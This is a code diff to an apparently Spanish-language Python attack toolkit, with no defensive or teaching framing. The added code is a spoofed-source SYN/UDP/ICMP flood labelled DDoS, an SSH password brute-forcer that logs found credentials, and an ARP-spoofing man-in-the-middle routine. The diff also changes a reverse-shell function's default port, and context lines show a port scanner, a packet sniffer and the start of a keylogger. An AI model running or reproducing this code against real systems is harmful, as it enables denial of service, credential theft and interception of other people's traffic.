@@ -3,8 +3,10 @@ import os
 import time
 import socket
 import subprocess
+import random
 import logging
 import threading
+from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 from typing import Optional, List, Dict, Union, Tuple
 
@@ -100,7 +102,6 @@ def get_network_range(interface: Optional[str] = None) -> Optional[str]:
         logger.error(f"Error obteniendo rango de red: {str(e)}", exc_info=True)
         return None
 
-
 def scan_ports(target_ip: str, start_port: int, end_port: int) -> Tuple[bool, str, List[Dict]]:
     """
     Escanea puertos en un rango específico y devuelve los resultados
@@ -153,7 +154,6 @@ def scan_ports(target_ip: str, start_port: int, end_port: int) -> Tuple[bool, st
         return False, f"Error de Nmap: {str(e)}", []
     except Exception as e:
         return False, f"Error inesperado: {str(e)}", []
-
 
 def scan_network(ip_range: Optional[str] = None) -> List[Dict[str, str]]:
     """Escanea dispositivos en la red con mejoras significativas"""
@@ -211,7 +211,7 @@ def scan_network(ip_range: Optional[str] = None) -> List[Dict[str, str]]:
         logger.error(f"Error en escaneo de red: {str(e)}", exc_info=True)
         return []
 
-def reverse_shell(target_ip: str, port: int = 4444) -> None:
+def reverse_shell(target_ip: str, port: int = 5000) -> None:
     """Shell inverso con mejor manejo de conexión"""
     if not validate_ip(target_ip):
         raise ValueError(f"IP inválida: {target_ip}")
@@ -242,212 +242,133 @@ def reverse_shell(target_ip: str, port: int = 4444) -> None:
     except Exception as e:
         logger.error(f"Error en shell inverso: {str(e)}", exc_info=True)
         raise
+import random
+import time
+from scapy.all import IP, TCP, UDP, ICMP, Raw, send
 
-def ddos_attack(target: str, port: int = 80, duration: int = 30, threads: int = 5) -> str:
-    """Ataque DDoS mejorado con más controles"""
+def ddos_attack(target_ip, port, duration):
+    start_time = time.time()
+    sent = 0
+    protocols = ['TCP', 'UDP', 'ICMP']
+    payload = Raw(load="X" * 1024)  # 1 KB de datos falsos
+
     try:
-        # Validación de parámetros
-        if not 1 <= port <= 65535:
-            raise ValueError("Puerto inválido")
-        if duration <= 0:
-            raise ValueError("Duración debe ser positiva")
-        if not 1 <= threads <= 50:
-            raise ValueError("Número de hilos inválido")
-            
-        target_ip = gethostbyname(target)
-        end_time = time.time() + duration
-        request_count = 0
-        
-        def attack():
-            nonlocal request_count
-            while time.time() < end_time:
-                try:
-                    with socket(AF_INET, SOCK_STREAM) as s:
-                        s.settimeout(1)
-                        s.connect((target_ip, port))
-                        s.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
-                        request_count += 1
-                except Exception:
-                    continue
-        
-        logger.info(f"Iniciando ataque DDoS a {target_ip}:{port} por {duration} segundos...")
-        with ThreadPoolExecutor(max_workers=threads) as executor:
-            futures = [executor.submit(attack) for _ in range(threads)]
-            
-        return f"Ataque completado. {request_count} solicitudes enviadas."
-        
-    except gaierror:
-        error = "No se pudo resolver el host"
-        logger.error(error)
-        return error
-    except ValueError as ve:
-        logger.error(str(ve))
-        return str(ve)
+        while time.time() - start_time < duration:
+            proto = random.choice(protocols)
+            dst_port = random.randint(1, 65535)
+            src_port = random.randint(1024, 65535)
+            spoof_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
+
+            if proto == 'TCP':
+                pkt = IP(dst=target_ip, src=spoof_ip) / TCP(sport=src_port, dport=dst_port, flags="S") / payload
+            elif proto == 'UDP':
+                pkt = IP(dst=target_ip, src=spoof_ip) / UDP(sport=src_port, dport=dst_port) / payload
+            elif proto == 'ICMP':
+                pkt = IP(dst=target_ip, src=spoof_ip) / ICMP() / payload
+
+            send(pkt, verbose=0)
+            sent += 1
+
+        return f"✅ DDoS finalizado: {sent} paquetes enviados a {target_ip}:{port} en {duration} segundos."
+    
     except Exception as e:
-        error = f"Error en DDoS: {str(e)}"
-        logger.error(error, exc_info=True)
-        return error
+        return f"❌ Error durante el ataque DDoS: {e}"
 
-def ssh_bruteforce(target: str, username: str, wordlist: str, max_threads: int = 5) -> Union[str, None]:
-    """Fuerza bruta SSH con mejor manejo de hilos"""
+def ssh_bruteforce(host, username, password_file, port=22):
+    logger = logging.getLogger(__name__)
+    logger.info("Iniciando ataque de fuerza bruta...")
+
+    # Verifica que el archivo existe
+    if not os.path.isfile(password_file):
+        logger.error(f"Archivo no encontrado: {password_file}")
+        return f"[ERROR] Archivo no encontrado: {password_file}"
+
+    # Carga las contraseñas
     try:
-        # Validaciones iniciales
-        if not validate_ip(target):
-            raise ValueError("IP/hostname inválido")
-        if not os.path.isfile(wordlist):
-            raise FileNotFoundError(f"Archivo de diccionario no encontrado: {wordlist}")
-            
-        # Configuración de Paramiko
-        paramiko.util.log_to_file('paramiko.log')
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        
-        found = None
-        lock = threading.Lock()
-        tested = 0
-        
-        def try_password(password: str) -> None:
-            nonlocal found, tested
-            if found:
-                return
-                
+        with open(password_file, "r") as file:
+            passwords = [line.strip() for line in file if line.strip()]
+    except Exception as e:
+        logger.error(f"No se pudo leer el archivo: {e}")
+        return f"[ERROR] No se pudo leer el archivo: {e}"
+
+    if not passwords:
+        logger.warning("El archivo de contraseñas está vacío.")
+        return "[ERROR] El archivo de contraseñas está vacío."
+
+    for password in passwords:
+        logger.info(f"Probando contraseña: {password}")
+        try:
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(host, port=port, username=username, password=password, timeout=5)
+            logger.info(f"¡Contraseña encontrada! Usuario: {username} | Contraseña: {password}")
+            client.close()
+            return f"[ÉXITO] Usuario: {username} | Contraseña: {password}"
+        except paramiko.AuthenticationException:
+            logger.warning("Contraseña incorrecta.")
+        except paramiko.SSHException as e:
+            logger.error(f"Error SSH: {e}")
+            time.sleep(3)  # Espera si hay muchos intentos
+        except Exception as e:
+            logger.error(f"Error general: {e}")
+        finally:
             try:
-                with lock:
-                    if found:  # Doble verificación por seguridad
-                        return
-                    tested += 1
-                    if tested % 100 == 0:
-                        logger.info(f"Probadas {tested} contraseñas...")
-                        
-                ssh.connect(
-                    target,
-                    username=username,
-                    password=password,
-                    timeout=DEFAULT_TIMEOUT,
-                    banner_timeout=30,
-                    auth_timeout=30
-                )
-                
-                with lock:
-                    found = password
-                    logger.info(f"Contraseña encontrada después de {tested} intentos")
-                    
-            except paramiko.AuthenticationException:
+                client.close()
+            except:
                 pass
-            except paramiko.SSHException as e:
-                logger.warning(f"Error SSH: {str(e)}")
-            except Exception as e:
-                logger.warning(f"Error probando contraseña: {str(e)}")
-            finally:
-                try:
-                    ssh.close()
-                except:
-                    pass
-                    
-        # Leer contraseñas
-        with open(wordlist, 'r', errors='ignore') as f:
-            passwords = [line.strip() for line in f if line.strip()]
-            
-        logger.info(f"Iniciando fuerza bruta con {len(passwords)} contraseñas...")
-        
-        # Ejecutar en paralelo
-        with ThreadPoolExecutor(max_workers=max_threads) as executor:
-            executor.map(try_password, passwords)
-            
-        return found if found else "Contraseña no encontrada"
-            
-    except Exception as e:
-        logger.error(f"Error en fuerza bruta SSH: {str(e)}", exc_info=True)
-        return str(e)
 
-def mitm_attack(target_ip: str, gateway_ip: str, interface: Optional[str] = None) -> threading.Event:
-    """Ataque MITM mejorado con ARP spoofing"""
+    logger.info("Fuerza bruta finalizada. No se encontró una contraseña válida.")
+    return "[INFO] Fuerza bruta finalizada. No se encontró una contraseña válida."
+
+
+def mitm_attack(target_ip: str, gateway_ip: str, interface: Optional[str] = None) -> Optional[threading.Event]:
     try:
-        if not validate_ip(target_ip) or not validate_ip(gateway_ip):
-            raise ValueError("IP inválida")
-            
-        # Obtener MAC addresses
+        iface = interface or scapy.conf.iface
+        print(f"[INFO] Usando interfaz: {iface}")
+
         target_mac = scapy.getmacbyip(target_ip)
         gateway_mac = scapy.getmacbyip(gateway_ip)
-        
-        if not target_mac or not gateway_mac:
-            raise ValueError("No se pudieron obtener direcciones MAC")
-            
+
+        if not target_mac:
+            raise ValueError(f"No se pudo obtener la MAC de {target_ip}")
+        if not gateway_mac:
+            raise ValueError(f"No se pudo obtener la MAC de {gateway_ip}")
+
         stop_event = threading.Event()
-        packet_count = 0
-        
+
         def restore_network():
-            """Restaura tablas ARP de forma más robusta"""
             try:
-                scapy.send(
-                    scapy.ARP(
-                        op=2,
-                        pdst=target_ip,
-                        hwdst="ff:ff:ff:ff:ff:ff",
-                        psrc=gateway_ip,
-                        hwsrc=gateway_mac
-                    ),
-                    count=5,
-                    verbose=False
-                )
-                scapy.send(
-                    scapy.ARP(
-                        op=2,
-                        pdst=gateway_ip,
-                        hwdst="ff:ff:ff:ff:ff:ff",
-                        psrc=target_ip,
-                        hwsrc=target_mac
-                    ),
-                    count=5,
-                    verbose=False
-                )
-                logger.info("Tablas ARP restauradas")
+                print("[INFO] Restaurando tablas ARP...")
+                scapy.sendp(scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=gateway_mac),
+                            iface=iface, count=5, verbose=False)
+                scapy.sendp(scapy.Ether(dst=gateway_mac) / scapy.ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=target_mac),
+                            iface=iface, count=5, verbose=False)
+                print("[OK] Tablas ARP restauradas.")
             except Exception as e:
-                logger.error(f"Error restaurando ARP: {str(e)}")
-                
+                print(f"[ERROR] Falló la restauración de red: {e}")
+
         def arp_spoof():
-            """Envía paquetes ARP falsos"""
-            nonlocal packet_count
+            print(f"[INFO] Iniciando ARP spoofing entre {target_ip} y {gateway_ip}")
             try:
-                logger.info(f"Iniciando ARP spoofing entre {target_ip} y {gateway_ip}")
-                
                 while not stop_event.is_set():
-                    scapy.send(
-                        scapy.ARP(
-                            op=2,
-                            pdst=target_ip,
-                            hwdst=target_mac,
-                            psrc=gateway_ip
-                        ),
-                        verbose=False
-                    )
-                    scapy.send(
-                        scapy.ARP(
-                            op=2,
-                            pdst=gateway_ip,
-                            hwdst=gateway_mac,
-                            psrc=target_ip
-                        ),
-                        verbose=False
-                    )
-                    packet_count += 2
+                    scapy.sendp(scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac),
+                                iface=iface, verbose=False)
+                    scapy.sendp(scapy.Ether(dst=gateway_mac) / scapy.ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac),
+                                iface=iface, verbose=False)
                     time.sleep(2)
-                    
             except Exception as e:
-                logger.error(f"Error en ARP spoofing: {str(e)}")
+                print(f"[ERROR] Falló el spoofing: {e}")
             finally:
                 restore_network()
-                
-        # Iniciar ataque en segundo plano
-        attack_thread = threading.Thread(target=arp_spoof, daemon=True)
-        attack_thread.start()
-        
-        return stop_event
-        
-    except Exception as e:
-        logger.error(f"Error en MITM: {str(e)}", exc_info=True)
-        return None
+                print("[INFO] Spoofing detenido.")
 
+        # Inicia el hilo
+        threading.Thread(target=arp_spoof, daemon=True).start()
+        return stop_event
+
+    except Exception as e:
+        print(f"[ERROR] No se pudo iniciar el ataque MITM: {e}")
+        return None
 
 logger = logging.getLogger(__name__)
 class PacketSniffer:
@@ -524,8 +445,6 @@ class PacketSniffer:
             summary += "Non-IP Packet"
 
         return summary
-
-
 
 def keylogger(output_file: str = "keylog.txt", stop_key: str = 'f12') -> Optional[str]:
     """Keylogger mejorado con más controles"""
